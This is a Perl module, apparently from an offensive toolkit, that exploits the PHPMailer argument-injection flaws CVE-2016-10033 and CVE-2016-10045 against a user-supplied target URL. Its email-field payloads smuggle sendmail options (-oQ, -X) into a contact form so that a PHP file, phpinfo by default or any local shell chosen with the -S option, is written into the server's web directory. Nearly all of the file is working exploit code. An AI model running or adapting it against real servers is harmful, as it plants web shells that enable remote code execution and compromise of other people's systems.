package Spellbook::Advisory::CVE_2016_10045 {
    use strict;
    use warnings;
    use Mojo::File;
    use Spellbook::Core::UserAgent;
    use Readonly;

    our $VERSION = '0.0.2';

    Readonly my $HTTP_OK => 200;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        my $directory = '/var/www/html/uploads';
        my %shell = (
            'name' => 'spellbook_xpl.php',
            'code' => '<?php phpinfo(); ?>'
        );

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'        => \$help,
            't|target=s'    => \$target,
            'S|shell=s'     => \$shell{'name'},
            'd|directory=s' => \$directory
        );

        if ($target) {
            if ($target !~ /^https?:\/\//xsm) {
                $target = "https://$target";
            }

            if ($shell{'name'} ne 'spellbook_xpl.php') {
                $shell{'code'} = Mojo::File -> new($shell{'name'}) -> slurp();
            }

            my $user_agent = Spellbook::Core::UserAgent -> new();

            my %payloads = (
                'CVE-2016-10033' => "\"attacker\\\" -oQ/tmp/ -X$directory/$shell{'name'}  some\"\@email.com",
                'CVE-2016-10045' => "\"attacker\\' -oQ/tmp/ -X$directory/$shell{'name'}  some\"\@email.com"
            );

            for my $variant (sort keys %payloads) {
                my $request = $user_agent -> post($target, [
                    'action' => 'send',
                    'name'   => 'LESIS',
                    'email'  => $payloads{$variant},
                    'msg'    => $shell{'code'}
                ]);

                if ($request -> code() == $HTTP_OK) {
                    push @result, "[+] $variant payload accepted (HTTP 200) - check $directory/$shell{'name'}";
                }
            }

            return @result;
        }

        if ($help) {
            return "\n"
                . "                \rAdvisory::CVE_2016_10045\n"
                . "                \r========================\n"
                . "                \r-h, --help        See this menu\n"
                . "                \r-t, --target      Define a target\n"
                . "                \r-S, --shell       Local PHP shell file to upload (default: built-in phpinfo)\n"
                . "                \r-d, --directory   Remote writable directory for the shell (default: /var/www/html/uploads)\n\n";
        }

        return 0;
    }
}

1;
